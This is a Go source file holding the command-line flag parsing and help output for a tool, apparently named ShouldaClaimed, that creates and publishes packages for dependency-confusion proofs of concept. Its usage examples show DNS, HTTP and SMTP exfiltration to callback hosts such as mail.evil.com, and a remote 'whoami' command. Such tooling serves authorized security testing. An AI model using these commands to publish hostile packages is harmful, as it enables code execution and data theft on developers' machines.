package cli

import (
	"flag"
	"fmt"

	"github.com/fatih/color"
)

// Config holds the configuration for the package generation.
type Config struct {
	Target string `json:"target"`
	Poc    string `json:"poc"`
	Rce    string `json:"rce"`
	Server string `json:"server"`
	OutDir string `json:"out_dir"`
	Force  bool   `json:"force"`
}

// ParseFlags parses the flags for the given FlagSet and returns a Config.
func ParseFlags(fs *flag.FlagSet, args []string) (*Config, error) {
	cfg := &Config{}

	fs.StringVar(&cfg.Target, "t", "", "Target package name")
	fs.StringVar(&cfg.Target, "target", "", "Target package name")
	fs.StringVar(&cfg.Poc, "p", "", "POC type (dns, http, smtp)")
	fs.StringVar(&cfg.Poc, "poc", "", "POC type (dns, http, smtp)")
	fs.StringVar(&cfg.Rce, "r", "", "RCE command or 'shell'")
	fs.StringVar(&cfg.Rce, "rce", "", "RCE command or 'shell'")
	fs.StringVar(&cfg.Server, "s", "", "Server domain or URL")
	fs.StringVar(&cfg.Server, "server", "", "Server domain or URL")
	fs.StringVar(&cfg.OutDir, "o", ".", "Output directory")
	fs.StringVar(&cfg.OutDir, "out", ".", "Output directory")
	fs.BoolVar(&cfg.Force, "f", false, "Force execution (skip existence checks)")
	fs.BoolVar(&cfg.Force, "force", false, "Force execution (skip existence checks)")

	// Custom Usage
	fs.Usage = func() { PrintCustomUsage(fs) }

	fs.Parse(args)

	// Validation
	if cfg.Target == "" {
		return nil, fmt.Errorf("-t/--target is required")
	}
	// Allow RCE + POC combination now.
	// Only require at least one action if strictmode, but honestly defaults handle it.
	// We'll just check Target is set.

	if cfg.Poc != "" {
		switch cfg.Poc {
		case "dns", "http", "smtp":
			// valid
		default:
			return nil, fmt.Errorf("invalid poc type: %s (must be dns, http, or smtp)", cfg.Poc)
		}
	}

	return cfg, nil
}

// PrintCustomUsage prints the styled help menu.
func PrintCustomUsage(fs *flag.FlagSet) {
	c := color.New(color.Bold)
	c.Println("\nUsage:")

	// Handle root usage vs subcommand usage name
	name := fs.Name()
	if name == "" {
		name = "<command>"
	}

	fmt.Printf("  ShouldaClaimed %s [flags]\n", name)

	c.Println("\nFlags:")
	fs.VisitAll(func(f *flag.Flag) {
		// Skip long versions in listing to keep it clean, or list manually
		if len(f.Name) > 1 {
			return
		}
		longName := ""
		switch f.Name {
		case "t":
			longName = "--target"
		case "p":
			longName = "--poc"
		case "r":
			longName = "--rce"
		case "s":
			longName = "--server"
		case "o":
			longName = "--out"
		case "f":
			longName = "--force"
		}

		fmt.Printf("  -%s, %-10s %s\n", f.Name, longName, f.Usage)
	})

	c.Println("\nExamples:")
	fmt.Println("  # DNS Exfiltration (Standard Info)")
	fmt.Println("  ShouldaClaimed create -t pkg-name -p dns -s collab.net")

	fmt.Println("\n  # RCE with SMTP Exfiltration (sends command output)")
	fmt.Println("  ShouldaClaimed create -t pkg-name -p smtp -s mail.evil.com:25 -r \"whoami\"")

	fmt.Println("\n  # HTTP Exfiltration")
	fmt.Println("  ShouldaClaimed create -t pkg-name -p http -s http://collab.net")

	fmt.Println("\n  # Publish with Force (Skip checks)")
	fmt.Println("  ShouldaClaimed publish -t pkg-name -p dns -s collab.net -f")
	fmt.Println("")
}

// formatBracketString colors only the text inside brackets.
// e.g. [SUC] -> [ (green SUC) ]
func formatBracketString(text string, c *color.Color) string {
	return fmt.Sprintf("[%s]", c.Sprint(text))
}

// PrintSuccess prints [SUC] (SUC is green), message in default, args in bold.
func PrintSuccess(format string, a ...interface{}) {
	prefix := formatBracketString("SUC", color.New(color.FgGreen))
	printMsg(prefix, format, a...)
}

// PrintError prints [ERR] (ERR is red), message in default, args in bold.
func PrintError(format string, a ...interface{}) {
	prefix := formatBracketString("ERR", color.New(color.FgRed))
	printMsg(prefix, format, a...)
}

// PrintInfo prints [INF] (INF is hi-blue), message in default, args in bold.
func PrintInfo(format string, a ...interface{}) {
	prefix := formatBracketString("INF", color.New(color.FgHiBlue))
	printMsg(prefix, format, a...)
}

func printMsg(prefix, format string, a ...interface{}) {
	// Bold all arguments
	boldArgs := make([]interface{}, len(a))
	for i, v := range a {
		boldArgs[i] = color.New(color.Bold).Sprint(v)
	}
	fmt.Printf("%s %s\n", prefix, fmt.Sprintf(format, boldArgs...))
}
